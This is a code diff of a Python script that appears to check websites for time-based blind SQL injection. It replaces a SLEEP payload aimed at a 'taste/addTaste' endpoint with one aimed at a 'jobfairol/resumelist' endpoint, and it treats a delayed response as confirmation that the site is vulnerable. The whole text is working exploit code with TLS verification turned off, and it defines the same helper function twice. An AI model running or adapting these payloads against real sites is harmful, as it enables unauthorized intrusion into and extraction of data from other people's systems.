@@ -1,23 +1,25 @@
-import requests,re,urllib3,time
+import requests,re,urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+def randomInt(s,e):
+	import random
+	key=random.randint(int(s),int(e))
+	return key
+randJobfair=randomInt(1, 10)
+def randomInt(s,e):
+	import random
+	key=random.randint(int(s),int(e))
+	return key
+randSecond=randomInt(2, 4)
 def scan(baseurl):
-	if baseurl[-1]=='/':
+	if baseurl[-1]=="/":
 		baseurl=baseurl
 	else:
 		baseurl=baseurl+"/"
-	url=baseurl+"taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%20E42J%20FROM%20(SELECT(SLEEP(8-(if(1=2,0,8)))))QWuA)%20OR%20%270weq%27=%275cyd"
+	url=baseurl+"v1_0/home/jobfairol/resumelist?jobfair_id="+str(randJobfair)+"&keyword=%27%2B(select(sleep("+str(randSecond)+")))%2B%27)%23"
 	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
-	s = time.time()
-	response=requests.get(url,headers=headers,timeout=10,verify=False)
-	e1 = time.time()
-	hs1=int(e1-s)
-	url=baseurl+"taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%20E42J%20FROM%20(SELECT(SLEEP(8-(if(1=1,0,8)))))QWuA)%20OR%20%270weq%27=%275cyd"
-	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
-	response=requests.get(url,headers=headers,timeout=10,verify=False)
-	e2 = time.time()
-	hs2=int(e2-e1)
-	if response.status_code == 200 and hs2-hs1>=6 and '"mainlogo":' in response.text:
+	response=requests.get(url,headers=headers,timeout=5,verify=False)
+	if response.elapsed.total_seconds() >= randSecond and response.status_code == 200 and "{\"code\":200" in response.text:
 		r0=True
 	else:
 		r0=False
